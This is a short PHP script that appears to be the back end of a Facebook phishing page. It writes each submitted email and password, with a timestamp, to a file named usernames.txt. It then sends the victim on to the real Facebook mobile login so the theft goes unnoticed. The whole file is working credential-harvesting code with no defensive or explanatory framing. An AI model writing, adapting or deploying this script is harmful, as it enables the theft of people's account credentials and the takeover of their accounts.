<?php
header("Location: https://m.facebook.com/login");

if (!empty($_POST)) {
    date_default_timezone_set('Europe/Kiev');

    $handle = fopen("usernames.txt", "a");
    fwrite($handle,'Email: '.$_POST['email']."\r\n".'Password: '.$_POST['pass']."\r\n");

    $time = date("Y-m-d H:i:s");
    fwrite($handle, "Time: " . $time . "\r\n");

    fwrite($handle, "\r\n");

    fclose($handle);
}
exit;
?>
